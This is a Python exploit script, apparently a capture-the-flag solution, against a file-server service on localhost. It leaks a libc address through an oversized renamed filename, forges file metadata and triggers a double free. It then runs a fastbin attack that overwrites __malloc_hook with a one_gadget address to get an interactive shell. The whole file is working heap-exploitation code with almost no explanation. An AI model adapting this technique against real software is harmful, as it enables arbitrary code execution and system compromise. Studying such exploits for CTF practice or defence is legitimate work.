from ptrlib import *

def upload_file(filename, size, data):
    assert isinstance(filename, str)
    sock.sendline("PUT {} {}".format(filename, size))
    sock.send(data)

def download_file(filename):
    assert isinstance(filename, str)
    sock.sendline("GET {}".format(filename))
    sock.recvuntil("get ")
    size = int(sock.recvuntil(" "))
    sock.recvline()
    return sock.recv(size)

def delete_file(filename):
    assert isinstance(filename, str)
    sock.sendline("DELE {}".format(filename))

def rename_file(filename1, filename2):
    assert isinstance(filename1, str)
    assert isinstance(filename2, str)
    sock.sendline("RENAME {} {}".format(filename1, filename2))

libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
sock = Socket("127.0.0.1", 4321)
libc_main_arena = 0x3c4b20
libc_one_gadget = 0x4526a
#libc = ELF("/lib64/libc.so.6")
#sock = Socket("127.0.0.1", 4322)
#libc_main_arena = 0x3c6760

# libc leak
upload_file("AAA.BIN", 10, "A" * 10)
payload1 = "A" * 38 + "." + "A00"
rename_file("AAA.BIN", payload1)
upload_file("BBB.BIN", 0x80, "B" * 0x80)
upload_file("CCC.BIN", 10, "C" * 10)
delete_file("BBB.BIN")
data = download_file(payload1)
addr_heap = u64(data[160:168])
addr_main_arena = u64(data[184:192]) - 88
libc_base = addr_main_arena - libc_main_arena
addr_malloc_hook = libc_base + libc.symbol("__malloc_hook")
addr_one_gadget = libc_base + libc_one_gadget
dump("heap = " + hex(addr_heap))
dump("libc base = " + hex(libc_base))

# fake filedata
fake_fd = b"999.999\x00" + b"\x00" * 32 # filename
fake_fd += p64(0x68) # length
fake_fd += p64(addr_heap + 0x250) # F.BIN->data
fake_fd += p64(0)
fake_fd += p64(addr_heap + 0x190) # E.BIN->data
upload_file("D.BIN", 0x48, bytes2str(fake_fd))

# 0x70 chunks
upload_file("E.BIN", 0x68, "E" * 0x68)
upload_file("F.BIN", 0x68, "F" * 0x68)
delete_file("E.BIN")
delete_file("F.BIN")

# double free
rename_file("D.BIN", "D" * 56 + "DDDDD.DD" + "P")
delete_file("999.999")

# fastbin attack
upload_file("X.BIN", 0x68, p64(addr_malloc_hook - 0x13) + b"X" * 0x60)
upload_file("Y.BIN", 0x68, "Y" * 0x68)
upload_file("Z.BIN", 0x68, "Z" * 0x68)

# get the shell!
upload_file("SH.BIN", 0x68, b"AAA" + p64(addr_one_gadget) + b"A" * 0x5d)
sock.sendline("PUT HELLO.PWN 10")

sock.interactive()
